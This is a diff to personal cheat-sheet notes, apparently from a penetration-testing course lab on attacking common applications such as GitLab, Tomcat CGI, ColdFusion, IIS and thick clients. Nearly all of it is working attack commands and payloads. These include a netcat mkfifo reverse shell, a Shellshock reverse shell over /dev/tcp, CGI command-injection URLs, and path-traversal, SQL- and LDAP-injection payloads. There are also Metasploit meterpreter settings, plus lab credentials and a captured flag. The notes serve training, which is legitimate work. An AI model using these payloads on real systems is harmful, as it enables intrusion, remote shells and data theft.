@@ -1285,8 +1285,18 @@ hacker:Welcome
 
 **USER ENUMERATION SCRIPT**
 
+```
+https://www.exploit-db.com/exploits/49821
+```
+
 ```bash
 ./gitlab_userenum.sh --url http://gitlab.inlanefreight.local:8081/ --userlist users.txt
+```
+
+```
+./gitlab_userenum.py \
+--url http://gitlab.inlanefreight.local:8081/ \
+--wordlist /usr/share/seclists/Usernames/cirt-default-usernames.txt
 ```
 
 **VALID USERS**
@@ -1306,7 +1316,7 @@ config.unlock_in = 10.minutes
 **RCE EXPLOIT**
 
 ```bash
-python3 gitlab_13_10_2_rce.py -t http://gitlab.inlanefreight.local:8081 -u mrb3n -p password1 -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.15 8443 >/tmp/f '
+python3 gitlab_13_10_2_rce.py -t http://gitlab.inlanefreight.local:8081 -u mrb3n -p password1 -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.17.198 8443 >/tmp/f '
 ```
 
 **NETCAT LISTENER**
@@ -1316,7 +1326,777 @@ nc -lnvp 8443
 ```
 
 
-#
-#
-#
-#
+# Attacking Tomcat CGI 
+
+**NMAP SCAN**
+
+```bash
+nmap -p- -sC -Pn 10.129.205.30 --open
+```
+
+**FFUF FUZZ (.CMD)**
+
+```bash
+ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.205.30:8080/cgi/FUZZ.cmd
+```
+
+**FFUF FUZZ (.BAT)**
+
+```bash
+ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.57.124:8080/cgi/FUZZ.bat
+```
+
+**DISCOVERED CGI SCRIPT**
+
+```bash
+http://10.129.205.30:8080/cgi/welcome.bat
+```
+
+**COMMAND INJECTION (DIR)**
+
+```bash
+http://10.129.205.30:8080/cgi/welcome.bat?&dir
+```
+
+**ENV VARIABLES ENUMERATION**
+
+```bash
+http://10.129.205.30:8080/cgi/welcome.bat?&set
+```
+
+**WHOAMI (FULL PATH)**
+
+```bash
+http://10.129.205.30:8080/cgi/welcome.bat?&c:\windows\system32\whoami.exe
+```
+
+**URL-ENCODED PAYLOAD**
+
+```bash
+http://10.129.205.30:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe
+```
+
+# Attacking CGI Applications - Shellshock
+
+**GOBUSTER ENUMERATION**
+
+```bash
+gobuster dir -u http://10.129.205.27/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x cgi
+```
+
+**DISCOVERED CGI SCRIPT**
+
+```bash
+http://10.129.205.27/cgi-bin/access.cgi
+```
+
+**CURL REQUEST (BASIC)**
+
+```bash
+curl -i http://10.129.205.27/cgi-bin/access.cgi
+```
+
+**SHELLSHOCK TEST PAYLOAD**
+
+```bash
+curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://10.129.205.27/cgi-bin/access.cgi
+```
+
+**REVERSE SHELL PAYLOAD**
+
+```bash
+curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.17.198/7777 0>&1' http://10.129.57.124/cgi-bin/access.cgi
+```
+
+**NETCAT LISTENER**
+
+```bash
+sudo nc -lvnp 7777
+```
+
+
+# Attacking Thick Client Applications
+
+**SMB ENUMERATION ARTIFACT**
+
+```bash
+Restart-OracleService.exe
+```
+
+**PROC MONITOR TOOL**
+
+```bash
+ProcMon64
+```
+
+**TEMP PATH**
+
+```bash
+C:\Users\Matt\AppData\Local\Temp
+```
+
+```bash
+C:\Users\cybervaca\AppData\Local\Temp\2
+```
+
+- Right-click → **Properties**
+- Security → Advanced
+- Disable inheritance
+- Convert permissions
+- Edit your user (Show advanced permissions)
+-  Uncheck:
+    - Delete
+    - Delete subfolders and files
+**GENERATED FILES**
+
+```bash
+6F39.bat
+6F39.tmp
+```
+
+```
+notepad C:\Users\cybervaca\AppData\Local\Temp\2\XXXX.bat
+```
+**BATCH FILE (ORIGINAL)**
+
+```batch
+@shift /0
+@echo off
+
+if %username% == matt goto correcto
+if %username% == frankytech goto correcto
+if %username% == ev4si0n goto correcto
+goto error
+
+:correcto
+echo TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA > c:\programdata\oracle.txt
+echo AAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4g >> c:\programdata\oracle.txt
+echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> c:\programdata\oracle.txt
+
+echo $salida = $null; $fichero = (Get-Content C:\ProgramData\oracle.txt) ; foreach ($linea in $fichero) {$salida += $linea }; $salida = $salida.Replace(" ",""); [System.IO.File]::WriteAllBytes("c:\programdata\restart-service.exe", [System.Convert]::FromBase64String($salida)) > c:\programdata\monta.ps1
+powershell.exe -exec bypass -file c:\programdata\monta.ps1
+del c:\programdata\monta.ps1
+del c:\programdata\oracle.txt
+c:\programdata\restart-service.exe
+del c:\programdata\restart-service.exe
+```
+
+**MODIFIED BATCH FILE**
+
+```batch
+@shift /0
+@echo off
+
+echo TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA > c:\programdata\oracle.txt
+echo AAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4g >> c:\programdata\oracle.txt
+echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> c:\programdata\oracle.txt
+
+echo $salida = $null; $fichero = (Get-Content C:\ProgramData\oracle.txt) ; foreach ($linea in $fichero) {$salida += $linea }; $salida = $salida.Replace(" ",""); [System.IO.File]::WriteAllBytes("c:\programdata\restart-service.exe", [System.Convert]::FromBase64String($salida)) > c:\programdata\monta.ps1
+```
+
+**POWERSHELL SCRIPT**
+
+```powershell
+$salida = $null; $fichero = (Get-Content C:\ProgramData\oracle.txt) ; foreach ($linea in $fichero) {$salida += $linea }; $salida = $salida.Replace(" ",""); [System.IO.File]::WriteAllBytes("c:\programdata\restart-service.exe", [System.Convert]::FromBase64String($salida))
+```
+
+**TOOLS**
+
+```bash
+strings64.exe
+de4dot
+dnSpy
+x64dbg
+```
+
+```
+xfreerdp /v:10.129.228.115 /u:cybervaca /p:'&aue%C)}6g-d{w' /cert:ignore /f
+```
+
+```
+xfreerdp /v:10.129.228.115 /u:cybervaca /p:'&aue%C)}6g-d{w' /cert:ignore /dynamic-resolution
+```
+# Exploiting Web Vulnerabilities in Thick-Client Applications
+
+**HOSTS FILE ENTRY**
+
+```cmd
+echo 10.10.10.174    server.fatty.htb >> C:\Windows\System32\drivers\etc\hosts
+```
+
+**EXTRACT JAR**
+
+```powershell
+ls fatty-client\
+```
+
+**SEARCH PORT**
+
+```powershell
+ls fatty-client\ -recurse | Select-String "8000" | Select Path, LineNumber | Format-List
+```
+
+**BEANS.XML**
+
+```xml
+<bean id="connectionContext" class = "htb.fatty.shared.connection.ConnectionContext">
+   <constructor-arg index="0" value = "server.fatty.htb"/>
+   <constructor-arg index="1" value = "8000"/>
+</bean>
+
+<bean id="trustedFatty" class = "htb.fatty.shared.connection.TrustedFatty">
+   <property name = "keystorePath" value = "fatty.p12"/>
+</bean>
+
+<bean id="secretHolder" class = "htb.fatty.shared.connection.SecretHolder">
+   <property name = "secret" value = "clarabibiclarabibiclarabibi"/>
+</bean>
+```
+
+**REBUILD JAR**
+
+```powershell
+cd .\fatty-client
+jar -cmf .\META-INF\MANIFEST.MF ..\fatty-client-new.jar *
+```
+
+**MANIFEST CLEAN**
+
+```txt
+Manifest-Version: 1.0
+Archiver-Version: Plexus Archiver
+Built-By: root
+Sealed: True
+Created-By: Apache Maven 3.3.9
+Build-Jdk: 1.8.0_232
+Main-Class: htb.fatty.client.run.Starter
+```
+
+**PATH TRAVERSAL PAYLOAD**
+
+```txt
+../../../../../../etc/passwd
+```
+
+**MODIFIED CLIENT (TRAVERSAL)**
+
+```java
+ClientGuiTest.this.currentFolder = "..";
+try {
+  response = ClientGuiTest.this.invoker.showFiles("..");
+```
+
+**COMPILE JAVA**
+
+```powershell
+javac -cp fatty-client-new.jar fatty-client-new.jar.src\htb\fatty\client\gui\ClientGuiTest.java
+```
+
+**PREPARE RAW JAR**
+
+```powershell
+mkdir raw
+cp fatty-client-new.jar raw\fatty-client-new-2.jar
+```
+
+**REPLACE CLASS FILES**
+
+```powershell
+mv -Force fatty-client-new.jar.src\htb\fatty\client\gui\*.class raw\htb\fatty\client\gui\
+```
+
+**BUILD TRAVERSE JAR**
+
+```powershell
+cd raw
+jar -cmf META-INF\MANIFEST.MF traverse.jar .
+```
+
+**FILE DOWNLOAD MODIFICATION**
+
+```java
+import java.io.FileOutputStream;
+
+public String open(String foldername, String filename) throws MessageParseException, MessageBuildException, IOException {
+    this.action = new ActionMessage(this.sessionID, "open");
+    this.action.addArgument(foldername);
+    this.action.addArgument(filename);
+    sendAndRecv();
+    String desktopPath = System.getProperty("user.home") + "\\Desktop\\fatty-server.jar";
+    FileOutputStream fos = new FileOutputStream(desktopPath);
+    byte[] content = this.response.getContent();
+    fos.write(content);
+    fos.close();
+    return "Successfully saved the file to " + desktopPath;
+}
+```
+
+**SQL INJECTION TEST**
+
+```txt
+qtc'
+```
+
+**SQL INJECTION PAYLOAD**
+
+```txt
+abc' UNION SELECT 1,'abc','a@b.com','abc','admin
+```
+
+**PASSWORD FUNCTION (ORIGINAL)**
+
+```java
+public void setPassword(String password) {
+    String hashString = this.username + password + "clarabibimakeseverythingsecure";
+    MessageDigest digest = MessageDigest.getInstance("SHA-256");
+    byte[] hash = digest.digest(hashString.getBytes(StandardCharsets.UTF_8));
+    this.password = DatatypeConverter.printHexBinary(hash);
+}
+```
+
+**PASSWORD FUNCTION (MODIFIED)**
+
+```java
+public void setPassword(String password) {
+    this.password = password;
+}
+```
+
+# ColdFusion - Discovery & Enumeration
+
+**NMAP SCAN**
+
+```bash
+nmap -p- -sC -Pn 10.129.54.88 --open
+```
+
+**COMMON PORTS**
+
+```bash
+80
+443
+1935
+25
+8500
+5500
+```
+
+**TARGET URL**
+
+```bash
+http://10.129.247.30:8500
+```
+
+**DISCOVERED DIRECTORIES**
+
+```bash
+/CFIDE/
+/cfdocs/
+```
+
+**ADMIN PANEL**
+
+```bash
+/CFIDE/administrator/index.cfm
+```
+
+**COMMON FILE EXTENSIONS**
+
+```bash
+.cfm
+.cfc
+```
+
+**DEFAULT FILES**
+
+```bash
+admin.cfm
+CFIDE/administrator/index.cfm
+```
+
+
+# Attacking ColdFusion
+# IIS Tilde Enumeration
+
+**NMAP SCAN**
+
+```bash
+nmap -p- -sV -sC --open 10.129.57.61
+```
+
+**IIS SHORTNAME SCANNER**
+
+```bash
+java -jar iis_shortname_scanner.jar 0 5 http://10.129.204.231/
+```
+
+**DISCOVERED SHORT NAMES**
+
+```bash
+ASPNET~1
+UPLOAD~1
+CSASPX~1.CS
+CSASPX~1.CS??
+TRANSF~1.ASP
+```
+
+**WORDLIST GENERATION**
+
+```bash
+egrep -r ^transf /usr/share/wordlists/* | sed 's/^[^:]*://' > /tmp/list.txt
+```
+
+**GOBUSTER ENUMERATION**
+
+```
+egrep -r ^transf /usr/share/wordlists/* | sed 's/^[^:]*://' > /tmp/list.txt 
+```
+
+```bash
+gobuster dir -u http://10.129.57.61/ -w /tmp/list.txt -x .aspx,.asp
+```
+
+**DISCOVERED FILE** 
+
+```bash
+/transf**.aspx
+```
+
+# LDAP Injection
+
+**Enumeration**
+
+```
+nmap -p- -sC -sV --open --min-rate=1000 10.129.205.18
+```
+
+**LDAP Query Structure (Reference)**
+
+```php
+(&(objectClass=user)(sAMAccountName=$username)(userPassword=$password))
+```
+
+**Injection — Username Wildcard**
+
+```php
+$username = "*";
+$password = "dummy";
+```
+
+**Injection — Password Wildcard**
+
+```php
+$username = "dummy";
+$password = "*";
+```
+
+**Authentication Bypass (Login Fields)**
+
+```
+Username: *
+Password: *
+```
+
+**ldapsearch Syntax**
+
+```
+ldapsearch -H ldap://ldap.example.com:389 -D "cn=admin,dc=example,dc=com" -w secret123 -b "ou=people,dc=example,dc=com" "(mail=john.doe@example.com)"
+```
+
+**Target**
+
+```
+10.129.205.18
+```
+
+# Web Mass Assignment Vulnerabilities
+
+---
+
+**SSH Access**
+
+```
+ssh root@10.129.205.15
+```
+
+```
+!x4;EW[ZLwmDx?=w
+```
+
+**Source Code Review**
+
+```
+cat /opt/asset-manager/app.py
+```
+
+**Burp Suite Intercept — Registration Request**
+
+```
+POST /register
+```
+
+```
+username=new&password=test&confirmed=test
+```
+
+**Login Credentials (After Exploit)**
+
+```
+username: new
+password: test
+```
+
+**Vulnerable Code Reference**
+
+```python
+for i,j,k in cur.execute('select * from users where username=? and password=?',(username,password)):
+  if k:
+    session['user']=i
+    return redirect("/home",code=302)
+  else:
+    return render_template('login.html',value='Account is pending for approval')
+```
+
+```python
+try:
+  if request.form['confirmed']:
+    cond=True
+except:
+      cond=False
+with sqlite3.connect("database.db") as con:
+  cur = con.cursor()
+  cur.execute('select * from users where username=?',(username,))
+  if cur.fetchone():
+    return render_template('index.html',value='User exists!!')
+  else:
+    cur.execute('insert into users values(?,?,?)',(username,password,cond))
+    con.commit()
+    return render_template('index.html',value='Success!!')
+```
+
+**Ruby on Rails Vulnerable Model (Reference)**
+
+```ruby
+class User < ActiveRecord::Base
+  attr_accessible :username, :email
+end
+```
+
+**Attacker-Injected Parameters (Reference)**
+
+```javascript
+{ "user" => { "username" => "hacker", "email" => "hacker@example.com", "admin" => true } }
+```
+
+**Tools**
+
+```
+Burp Suite
+```
+
+
+
+
+# Attacking Applications Connecting to Services
+
+---
+
+**SSH Access**
+
+```
+ssh htb-student@10.129.205.20
+```
+
+```
+HTB_@cademy_stdnt!
+```
+
+**Run Binary**
+
+```
+./octopus_checker
+```
+
+**GDB Load Binary**
+
+```
+gdb ./octopus_checker
+```
+
+**GDB — Set Disassembly Flavor**
+
+```
+set disassembly-flavor intel
+```
+
+**GDB — Disassemble Main**
+
+```
+disas main
+```
+
+**GDB — Set Breakpoint at SQLDriverConnect**
+
+```
+b *0x5555555551b0
+```
+
+**GDB — Run Program**
+
+```
+run
+```
+
+**Connection String (Extracted from RDX Register)**
+
+```
+DRIVER={ODBC Driver 17 for SQL Server};SERVER=localhost, 1401;UID=username;PWD=password;
+```
+
+**DLL Metadata Inspection**
+
+```
+Get-FileMetaData .\MultimasterAPI.dll
+```
+
+**Tools**
+
+```
+gdb
+PEDA
+dnSpy
+```
+
+**DLL Target File**
+
+```
+MultimasterAPI.dll
+```
+
+**DLL Inspection Path**
+
+```
+MultimasterAPI.Controllers -> ColleagueController
+```
+
+---
+
+---
+
+
+
+# Other Notable Applications 
+---
+
+**Target**
+
+```
+10.129.201.102
+```
+
+**Enumeration**
+
+```
+nmap -p- -sC -sV --open --min-rate=1000 10.129.201.90
+```
+
+**Default Credentials to Try**
+
+```
+system:manager
+```
+
+```
+nagiosadmin:PASSW0RD
+```
+
+**Axis2 — AAR Webshell Upload**
+
+```
+Metasploit
+```
+
+**Websphere — WAR Deployment**
+
+```
+WAR
+```
+
+**vCenter — Privilege Escalation (Windows)**
+
+```
+JuicyPotato
+```
+
+**Flag Location**
+
+```
+C:\Users\Administrator\Desktop\flag.txt
+```
+
+```
+exploit(multi/http/weblogic_admin_handle_rce) > set payload windows/x64/meterpreter_reverse_tcp
+```
+
+# Application Hardening
+
+**Inventory / Discovery Tools**
+
+```
+nmap
+EyeWitness
+```
+
+**Joomla — Secret Key Login URL Pattern**
+
+```
+http://joomla.inlanefreight.local/administrator?thisismysecretkey
+```
+
+**Jenkins — Authorization Plugin**
+
+```
+Matrix Authorization Strategy
+```
+
+**WordPress — Security Plugin**
+
+```
+WordFence
+```
+
+---
+
+---
+
+
+# SA I
+
+set ForceExploit true
+msf exploit(windows/http/tomcat_cgi_cmdlineargs) > run
+
+meterpreter > cat C:/Users/Administrator/Desktop/flag.txt
+f55763d31a8f63ec935abd07aee5d3d0
+
+
+
+# SA II
+
+ffuf -c \
+-w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ \
+-u http://10.129.201.90/ \
+-H "Host: FUZZ.inlanefreight.local" 
+
+
+from readme 
+
+monitoring.inlanefreight.local
+
+
+```
+find / -path /proc -prune  -o -type f -name *flag*.txt 2>/dev/null
+```
+
+# SA III
+xfreerdp /v:10.129.95.200 /u:Administrator /p:'xcyj8izxNVzhf4z' /cert:ignore /dynamic-resolution
+![[Pasted image 20260420003658.png]]
